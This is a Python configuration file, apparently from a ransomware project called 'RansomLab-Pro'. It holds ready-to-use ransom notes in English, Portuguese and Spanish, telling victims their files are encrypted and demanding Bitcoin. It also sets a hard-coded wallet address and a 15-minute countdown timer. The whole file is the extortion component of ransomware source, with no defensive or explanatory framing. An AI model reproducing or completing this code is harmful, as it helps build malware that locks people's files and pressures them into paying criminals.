# ransom/ransom_config.py

# 🔥 Mensagens multilíngues pré-definidas para ransom.html/.txt
def get_ransom_message(locale: str = "en-US") -> dict:
    messages = {
        "en-US": {
            "title": "Your Files Have Been Encrypted!",
            "body": (
                "All your important files have been encrypted using military-grade algorithms.\n"
                "Do not attempt to rename or restore them without the decryption key.\n\n"
                "To recover your files:\n"
                "1. Send the specified amount of Bitcoin to the wallet below.\n"
                "2. Include your UID in the payment message.\n"
                "3. Contact the operator with your payment confirmation.\n\n"
                "Without payment, your files will remain inaccessible."
            ),
            "footer": "RansomLab-Pro Decryption Interface — UID: {UID}"
        },
        "pt-BR": {
            "title": "Seus Arquivos Foram Criptografados!",
            "body": (
                "Todos os seus arquivos importantes foram criptografados com algoritmos de nível militar.\n"
                "Não tente renomear ou restaurar sem a chave de descriptografia.\n\n"
                "Para recuperar seus arquivos:\n"
                "1. Envie a quantidade especificada de Bitcoin para a carteira abaixo.\n"
                "2. Inclua seu UID na mensagem do pagamento.\n"
                "3. Entre em contato com o operador com a confirmação do pagamento.\n\n"
                "Sem pagamento, seus arquivos permanecerão inacessíveis."
            ),
            "footer": "Interface de Descriptografia RansomLab-Pro — UID: {UID}"
        },
        "es-ES": {
            "title": "¡Tus Archivos Han Sido Encriptados!",
            "body": (
                "Todos tus archivos importantes han sido encriptados con algoritmos militares.\n"
                "No intentes renombrarlos ni restaurarlos sin la clave de desencriptación.\n\n"
                "Para recuperar tus archivos:\n"
                "1. Envía la cantidad especificada de Bitcoin a la billetera abajo.\n"
                "2. Incluye tu UID en el mensaje de pago.\n"
                "3. Contacta al operador con la confirmación del pago.\n\n"
                "Sin pago, tus archivos seguirán bloqueados."
            ),
            "footer": "Interfaz de Descifrado RansomLab-Pro — UID: {UID}"
        }
    }

    return messages.get(locale, messages["en-US"])


# 🔐 Endereço BTC (placeholder global)
BITCOIN_WALLET = "bc1q4g636c8qlqpazkxc73zeudsn4e52mysycfmfwm"

# ⏳ Timer regressivo (segundos)
DEFAULT_TIMER_SECONDS = 900  # 15 minutos

# 🌐 Idiomas suportados
SUPPORTED_LOCALES = ["en-US", "pt-BR", "es-ES"]
